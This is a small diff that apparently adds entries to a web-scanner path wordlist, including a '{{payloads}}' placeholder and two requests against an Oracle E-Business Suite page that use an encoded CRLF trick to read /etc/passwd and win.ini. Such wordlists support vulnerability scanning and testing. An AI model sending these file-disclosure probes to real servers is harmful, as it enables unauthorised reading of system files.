@@ -1,1 +1,4 @@
 /thruk/
+{{payloads}}
+/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
+/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=win.ini&ifl=c:/windows/
